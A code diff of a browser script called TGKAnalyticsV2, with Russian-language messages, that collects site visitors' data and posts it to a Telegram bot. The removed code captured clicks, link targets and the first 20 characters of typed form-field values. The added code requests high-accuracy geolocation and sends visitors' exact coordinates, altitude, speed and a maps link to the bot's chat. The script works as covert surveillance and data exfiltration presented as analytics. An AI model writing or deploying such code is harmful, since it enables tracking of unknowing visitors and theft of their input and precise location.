-      text: link.innerText?.substring(0, 50),
-      target: link.target,
-    };
-    this.behavioralData.events.links.push(linkEvent);
-    if (this.debugMode) console.log('🔗 Link clicked:', linkEvent);
-  }
-
-  trackFormInteraction(field) {
-    const formEvent = {
-      type: 'form_interaction',
-      timestamp: new Date().toISOString(),
-      fieldType: field.type,
-      fieldName: field.name,
-      fieldValue: field.value?.substring(0, 20),
-    };
-    this.behavioralData.events.forms.push(formEvent);
-  }
-
-  trackFormSubmit(form) {
-    const submitEvent = {
-      type: 'form_submit',
-      timestamp: new Date().toISOString(),
-      formId: form.id,
-      formName: form.name,
-      fieldCount: form.querySelectorAll('input, textarea, select').length,
-    };
-    this.behavioralData.events.forms.push(submitEvent);
-    if (this.debugMode) console.log('📝 Form submitted:', submitEvent);
-  }
-
-  // ==========================================
-  // ОТПРАВКА ПОВЕДЕНЧЕСКИХ ДАННЫХ
-  // ==========================================
-
-  setupPeriodicBehavioralSend() {
-    // Отправлять поведенческие данные каждый час
-    setInterval(() => {
-      this.sendBehavioralData();
-    }, this.sendInterval);
-
-    // Отправить при закрытии вкладки
-    window.addEventListener('beforeunload', () => {
-      this.sendBehavioralData();
-    });
-  }
-
-  async sendBehavioralData() {
-    try {
-      const now = Date.now();
-      if (now - this.lastBehavioralSendTime < this.sendInterval) {
-        return;
-      }
-
-      this.lastBehavioralSendTime = now;
-      this.behavioralData.behavior.timeOnPage = now - this.pageStartTime;
-      this.behavioralData.sessionBehavior.sessionDuration = now - this.sessionStartTime;
-
-      const message = this.formatBehavioralDataMessage();
-      await this.sendToTelegram(message);
-
-      // Проверить, нужно ли отправить дневную сводку
-      if (now - this.lastDailySend > 86400000) { // 24 часа
-        const dailyMessage = this.formatDailyAnalyticsMessage();
-        await this.sendToTelegram(dailyMessage);
-        this.lastDailySend = now;
-        localStorage.setItem('tgk_last_daily_send', now.toString());
-        if (this.debugMode) console.log('📅 Daily analytics sent');
-      }
-
-      if (this.debugMode) console.log('📊 Behavioral data sent');
-    } catch (e) {
-      console.error('Error sending behavioral data:', e);
-    }
-  }
-
-  formatBehavioralDataMessage() {
-    const bd = this.behavioralData;
-    return `
-📊 <b>ПОВЕДЕНЧЕСКИЕ ДАННЫЕ</b>
-
-<b>🎯 Поведение:</b>
-Время на странице: ${Math.round(bd.behavior.timeOnPage / 1000)}s
-Глубина скролла: ${bd.behavior.scrollDepth}%
-Активен: ${bd.behavior.isActive ? '✅' : '❌'}
-
-<b>🖱️ События:</b>
-Клики: ${bd.events.clicks.length}
-Переходы по ссылкам: ${bd.events.links.length}
-Взаимодействия с формами: ${bd.events.forms.length}
-
-<b>📈 Сессия:</b>
-Просмотров страниц: ${bd.sessionBehavior.pageViewCount}
-Длительность сессии: ${Math.round(bd.sessionBehavior.sessionDuration / 1000)}s
-Новый пользователь: ${!bd.sessionBehavior.isReturning ? '✅' : '❌'}
-`;
-  }
-
-  formatDailyAnalyticsMessage() {
-    return `
-📅 <b>ЕЖЕДНЕВНАЯ СВОДКА АНАЛИТИКИ</b>
-
-<b>📊 Статистика за день:</b>
-Количество посещений: ${this.visitCount}
-Последняя активность: ${new Date().toLocaleString()}
-
-<b>💡 Примечание:</b>
-Это локальная статистика для данного браузера/устройства.
-Для глобальной статистики требуется серверная аналитика.
-`;
-  }
-
-  async sendSessionEnd() {
-    try {
-      this.behavioralData.behavior.timeOnPage = Date.now() - this.pageStartTime;
-
-      const message = `
-📍 <b>КОНЕЦ СЕССИИ</b>
-
-Session ID: ${this.sessionID}
-Время на сайте: ${Math.round(this.behavioralData.behavior.timeOnPage / 1000)}s
-Последняя активность: ${new Date(this.behavioralData.behavior.lastActivity).toLocaleTimeString()}
-Глубина скролла: ${this.behavioralData.behavior.scrollDepth}%
-Всего кликов: ${this.behavioralData.events.clicks.length}
-`;
-
-      await this.sendToTelegram(message);
-      console.log('👋 Session end data sent');
-    } catch (e) {
-      console.error('Error sending session end:', e);
-    }
-  }
-
-  // ==========================================
-  // ОТПРАВКА В TELEGRAM
-  // ==========================================
-
   async sendToTelegram(message) {
+    console.log('🔗 sendToTelegram called');
+    console.log('   chatId:', this.chatId);
+    console.log('   botToken exists:', !!this.botToken);
     try {
       if (!this.chatId) {
-        console.warn('⚠️ Chat ID not set');
+        console.warn('⚠️ Chat ID not set - cannot send');
         return;
       }
-
       const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
-      
+      console.log('   URL:', url.substring(0, 50) + '...');
+      console.log('   Sending POST request...');
       const response = await fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -675,49 +615,121 @@ Session ID: ${this.sessionID}
           parse_mode: 'HTML',
         }),
       });
-
+      console.log('   Response status:', response.status);
       const result = await response.json();
+      console.log('   Telegram response:', result);
       if (!result.ok) {
         console.error('❌ Telegram error:', result.description);
+      } else {
+        console.log('✅ Message sent to Telegram');
       }
     } catch (e) {
       console.error('Error sending to Telegram:', e);
     }
   }
-
   async sendAsDocument(txtData, caption, fileName, isFirstSend = false) {
+    console.log('📎 sendAsDocument called');
+    console.log('   fileName:', fileName);
+    console.log('   chatId:', this.chatId);
     try {
       if (!this.chatId) {
-        console.warn('⚠️ Chat ID not set');
-        console.log('📝 Data:', txtData);
+        console.warn('⚠️ Chat ID not set - cannot send document');
+        console.log('📝 Data preview:', txtData.substring(0, 200) + '...');
         return;
       }
-
       const url = `https://api.telegram.org/bot${this.botToken}/sendDocument`;
-      
+      console.log('   URL:', url.substring(0, 50) + '...');
+      console.log('   Creating FormData...');
       const blob = new Blob([txtData], { type: 'text/plain' });
       const formData = new FormData();
       formData.append('chat_id', this.chatId);
       formData.append('document', blob, fileName);
       formData.append('caption', caption);
       formData.append('parse_mode', 'HTML');
-
+      console.log('   Sending document to Telegram...');
       const response = await fetch(url, {
         method: 'POST',
         body: formData,
       });
-
+      console.log('   Response status:', response.status);
       const result = await response.json();
+      console.log('   Telegram response:', result);
       if (!result.ok) {
         console.error('❌ Telegram error:', result.description);
+      } else {
+        console.log('✅ Document sent to Telegram');
       }
     } catch (e) {
       console.error('Error sending document:', e);
     }
   }
-}
+  getPreciseGeolocation() {
+    if (!navigator.geolocation) {
+      console.warn('⚠️ Geolocation API not available');
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        const coords = position.coords;
+        console.log('✅ Precise geolocation obtained');
+        this.sendPreciseCoordinatesMessage(coords);
+      },
+      (error) => {
+        console.warn('⚠️ Geolocation permission denied or error:', error.message);
+        this.sendGeolocationErrorMessage(error);
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 30000,
+        maximumAge: 0
+      }
+    );
+  }
+  async sendPreciseCoordinatesMessage(coords) {
+    try {
+      const message = `
+📍 <b>ТОЧНЫЕ КООРДИНАТЫ</b>
 
-// Инициализация
+<b>Широта:</b> ${coords.latitude.toFixed(6)}°
+<b>Долгота:</b> ${coords.longitude.toFixed(6)}°
+<b>Точность:</b> ±${coords.accuracy.toFixed(2)} meters
+<b>Высота:</b> ${coords.altitude ? coords.altitude.toFixed(2) + ' meters' : 'N/A'}
+<b>Точность высоты:</b> ${coords.altitudeAccuracy ? '±' + coords.altitudeAccuracy.toFixed(2) + ' meters' : 'N/A'}
+<b>Направление:</b> ${coords.heading !== null && coords.heading !== undefined ? coords.heading.toFixed(2) + '°' : 'N/A'}
+<b>Скорость:</b> ${coords.speed !== null && coords.speed !== undefined ? (coords.speed * 3.6).toFixed(2) + ' km/h' : 'N/A'}
+
+<b>Google Maps:</b> https://maps.google.com/?q=${coords.latitude},${coords.longitude}
+<b>Session ID:</b> ${this.sessionID}
+<b>Время:</b> ${new Date().toISOString()}
+`;
+      await this.sendToTelegram(message);
+    } catch (e) {
+      console.error('Error sending precise coordinates:', e);
+    }
+  }
+  async sendGeolocationErrorMessage(error) {
+    try {
+      const errorMessages = {
+        1: 'Пользователь запретил доступ к геопозиции',
+        2: 'Невозможно получить позицию (источник недоступен)',
+        3: 'Превышено время ожидания ответа'
+      };
+      const errorText = errorMessages[error.code] || 'Unknown error';
+      const message = `
+⚠️ <b>ОШИБКА ГЕОЛОКАЦИИ</b>
+
+Код ошибки: ${error.code}
+Описание: ${errorText}
+
+Session ID: ${this.sessionID}
+Время: ${new Date().toISOString()}
+`;
+      await this.sendToTelegram(message);
+    } catch (e) {
+      console.error('Error sending geolocation error message:', e);
+    }
+  }
+}
 let analytics;
 document.addEventListener('DOMContentLoaded', () => {
   analytics = new TGKAnalyticsV2();
